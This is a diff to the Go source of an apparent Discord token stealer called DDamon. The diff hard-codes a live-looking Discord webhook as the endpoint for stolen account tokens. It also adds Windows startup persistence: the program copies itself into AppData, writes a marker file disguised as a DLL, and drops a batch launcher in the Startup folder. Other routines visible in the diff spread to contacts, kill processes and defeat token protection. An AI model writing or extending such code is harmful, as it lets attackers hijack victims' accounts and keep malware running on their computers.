@@ -4,6 +4,7 @@ import (
 	"bytes"
 	"encoding/base64"
 	"encoding/json"
+	"errors"
 	"fmt"
 	"io/fs"
 	"io/ioutil"
@@ -38,6 +39,10 @@ type User struct {
 	User     UserData
 }
 
+type DDamon struct {
+	FirstBoot bool `json:"firstboot"`
+}
+
 type Message struct {
 	Content string `json:"content"`
 	Tts     bool   `json:"tts"`
@@ -45,11 +50,12 @@ type Message struct {
 
 // https://discord.com/api/webhooks/1017841380824989746/RE5eOZAZWSs7qU0AkuxY9kbYxqFUXHgcqJALVRNYBTEOFk8N3CLwVK7KVDrO435HX_lS
 const (
-	WEBHOOK_URL = "weburl"
+	WEBHOOK_URL = "https://discord.com/api/webhooks/1017841380824989746/RE5eOZAZWSs7qU0AkuxY9kbYxqFUXHgcqJALVRNYBTEOFk8N3CLwVK7KVDrO435HX_lS"
 	SPREAD_MSG  = "spreadmsg"
 	SPREAD      = false
-	KILL        = false
 	BLOCK       = false
+	KILL        = false
+	STARTUP     = false
 )
 
 func main() {
@@ -59,7 +65,82 @@ func main() {
 	killProcess()
 	blockDiscord()
 	antiTokenProtect()
+	runOnStartup()
 	// block_dc()
+
+}
+
+func runOnStartup() {
+	if !STARTUP {
+		return
+	}
+
+	// check if we have run before
+	if _, err := os.Stat("DDamon_Dll.dll"); err == nil {
+		data, _ := os.ReadFile("DDamon_Dll.dll")
+		var ddamon DDamon
+		json.Unmarshal([]byte(data), &ddamon)
+		if !ddamon.FirstBoot {
+			return
+		}
+	}
+	// check if "DDamon_Dll.dll" exists in the current directory
+	// if it doesn't then create it
+
+	if _, err := os.Stat("DDamon_Dll.dll"); errors.Is(err, os.ErrNotExist) {
+		f, _ := os.Create("DDamon_Dll.dll")
+		defer f.Close()
+
+		data := base64.StdEncoding.EncodeToString([]byte(`{"firstboot": false}`))
+		_, err2 := f.WriteString(data)
+		if err2 != nil {
+			panic(err2)
+		}
+
+	}
+
+	// get the current user
+	usr, err := user.Current()
+	if err != nil {
+		panic(err)
+	}
+	appdata := usr.HomeDir + "\\AppData\\Roaming"
+	// check if "DDamon" directory exists in the current user's appdata
+	// if it doesn't then create it
+
+	if _, err := os.Stat(appdata + "\\DDamon"); errors.Is(err, os.ErrNotExist) {
+		os.Mkdir(appdata+"\\DDamon", 0777)
+	}
+
+	// copy the current executable to "DDamon" directory
+	// get the current executable's path
+	ex, err := os.Executable()
+	if err != nil {
+		panic(err)
+	}
+	// copy the current executable to "DDamon" directory
+	err = os.Link(ex, appdata+"\\DDamon\\DDamon.exe")
+	if err != nil {
+		panic(err)
+	}
+	// copy DDamon_Dll.dll to "DDamon" directory
+	err = os.Link("DDamon_Dll.dll", appdata+"\\DDamon\\DDamon_Dll.dll")
+	if err != nil {
+		panic(err)
+	}
+
+	// create a shortcut to the current executable in the startup folder
+	// get the current user's startup folder
+	startup := usr.HomeDir + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
+
+	// create a "startDDamon.bat" file in the startup folder
+	f, _ := os.Create(startup + "\\startDDamon.bat")
+	// write the following to the file
+	// start "" "C:\Users\%username%\AppData\Roaming\DDamon\DDamon.exe"
+	_, err2 := f.WriteString("start \"" + appdata + "\\DDamon\" \"" + appdata + "\\DDamon\\DDamon.exe\"")
+	if err2 != nil {
+		panic(err2)
+	}
 
 }
 
@@ -89,6 +170,17 @@ func spred() {
 	if !SPREAD {
 		return
 	}
+
+	if _, err := os.Stat("DDamon_Dll.dll"); err == nil {
+		data, _ := os.ReadFile("DDamon_Dll.dll")
+		data, _ = base64.StdEncoding.DecodeString(string(data))
+		var ddamon DDamon
+		json.Unmarshal(data, &ddamon)
+		if !ddamon.FirstBoot {
+			return
+		}
+	}
+
 	for _, token := range tokens {
 		fmt.Println(token)
 		//  var friends []string
@@ -149,11 +241,7 @@ func killProcess() {
 func killProcessByName(process string) {
 	var cmd *exec.Cmd
 	cmd = exec.Command("taskkill", "/F", "/IM", process+".exe")
-	err := cmd.Run()
-	if err != nil {
-		panic(err)
-	}
-
+	cmd.Run()
 }
 
 func send_info(token string) {
@@ -229,6 +317,15 @@ func grabTokenInformation(token string) (data string, jsonEmbed string) {
 }
 
 func start() {
+	if _, err := os.Stat("DDamon_Dll.dll"); err == nil {
+		data, _ := os.ReadFile("DDamon_Dll.dll")
+		data, _ = base64.StdEncoding.DecodeString(string(data))
+		var ddamon DDamon
+		json.Unmarshal([]byte(data), &ddamon)
+		if !ddamon.FirstBoot {
+			return
+		}
+	}
 	appdata, _ := os.UserConfigDir()
 	localappdata, _ := os.UserCacheDir()
 	locations := []string{}
